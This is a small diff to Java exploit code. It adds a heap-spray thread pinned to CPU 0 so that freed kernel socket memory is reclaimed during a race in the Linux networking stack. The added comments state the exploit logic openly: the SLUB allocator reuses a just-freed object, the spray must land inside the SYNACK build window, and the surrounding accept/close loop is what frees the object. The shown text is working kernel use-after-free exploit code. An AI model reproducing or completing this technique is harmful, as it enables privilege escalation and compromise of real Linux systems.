@@ -621,6 +621,18 @@ int[] fds = snapshotChildFds();
         }
         long accepted = 0;
 
+        // The spray thread must live on the same cpu as this loop: SLUB hands
+        // a just-freed object to the next same-cpu allocation, and the racing
+        // SYNACK needs that reuse to happen inside its few-microsecond build
+        // window. CPU 0 is where the accept/close/free runs.
+        Thread sprayer = new Thread(() -> {
+            while (running.get() && attackFd == fd) {
+                Native.spraySameCpu(0, 50);
+            }
+        }, "tun-spray");
+        sprayer.setDaemon(true);
+        sprayer.start();
+
         // Accept and close with nothing in between.
         //
         // Closing the child is what runs inet_sock_destruct() and frees the
